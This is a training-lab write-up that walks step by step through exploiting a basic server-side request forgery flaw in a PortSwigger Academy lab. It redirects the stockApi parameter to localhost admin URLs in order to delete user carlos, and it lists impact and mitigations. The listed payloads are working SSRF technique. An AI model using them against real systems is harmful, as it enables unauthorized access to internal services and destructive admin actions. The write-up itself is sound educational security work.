# Lab: Basic SSRF Against the Local Server

## Overview

This lab demonstrates a **Server-Side Request Forgery (SSRF)** vulnerability where the application fetches stock information from a user-supplied URL. By manipulating the `stockApi` parameter, it is possible to force the server to send requests to its own localhost interface and access internal resources that are not publicly accessible.

The objective is to use SSRF to access the internal admin panel and delete the user `carlos`.

---

## Objective

Exploit the SSRF vulnerability to:

- Access the internal admin interface.
- Delete the user **carlos**.
- Solve the lab.

---

## Tools Used

- Burp Suite Community Edition
- Firefox
- PortSwigger Web Security Academy

---

## Vulnerability Explanation

The application retrieves stock information by sending a server-side request to the URL specified in the `stockApi` parameter.

Original request:

```http
POST /product/stock HTTP/2

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=3&storeId=1
```

Since the application does not properly validate the destination URL, an attacker can replace it with an internal address such as:

```text
http://localhost/admin
```

The request is performed by the server itself, allowing access to services running only on the local machine.

---

## Steps to Reproduce

### Step 1: Intercept the Stock Check Request

1. Open any product.
2. Click **Check stock**.
3. Capture the request in Burp Suite.

Original parameter:

```text
stockApi=http://stock.weliketoshop.net:8080/...
```

---

### Step 2: Access the Internal Admin Panel

Modify the `stockApi` parameter:

```text
stockApi=http://localhost/admin
```

Forward the request.

The server responds with the internal administration page containing the list of users and delete links.

Example response:

```text
/admin/delete?username=carlos
```

---

### Step 3: Identify the Delete Endpoint

Inspect the admin page response and locate the delete endpoint:

```text
/admin/delete?username=carlos
```

This endpoint is only accessible from localhost.

---

### Step 4: Perform SSRF to Delete the User

Modify the intercepted request again:

```text
stockApi=http://localhost/admin/delete?username=carlos
```

Forward the request.

The application sends the request internally, deleting the user.

---

### Step 5: Verify the Solution

Return to the lab page.

The lab is marked as solved after the user **carlos** is successfully deleted.

---

## Payloads Used

Access admin panel:

```text
http://localhost/admin
```

Delete Carlos:

```text
http://localhost/admin/delete?username=carlos
```

---

## Proof of Concept

1. Intercepted the stock check request.
2. Modified the `stockApi` parameter to target `http://localhost/admin`.
3. Retrieved the internal admin interface.
4. Identified the delete endpoint for the user `carlos`.
5. Sent another SSRF request targeting the delete endpoint.
6. Successfully deleted the user.
7. Lab completed successfully.

---

## Impact

Successful exploitation can allow an attacker to:

- Access internal web applications.
- Reach services that are not exposed externally.
- Bypass network restrictions.
- Perform unauthorized administrative actions.
- Read sensitive internal resources.
- Potentially achieve Remote Code Execution (depending on internal services).

---

## Mitigation

- Never allow arbitrary URLs in server-side requests.
- Use a strict allowlist of permitted destinations.
- Block requests to localhost and private IP ranges.
- Disable unnecessary URL schemes.
- Validate and normalize user input before making outbound requests.
- Restrict outbound network access using firewall rules.
- Separate internal administrative services from user-accessible functionality.

---

## Key Learnings

- Learned how Server-Side Request Forgery (SSRF) works.
- Understood how applications can be abused to access internal resources.
- Practiced modifying server-side requests using Burp Suite.
- Learned how to access localhost-only services through SSRF.
- Demonstrated how SSRF can lead to unauthorized administrative actions.
- Gained hands-on experience exploiting SSRF vulnerabilities in a controlled environment.
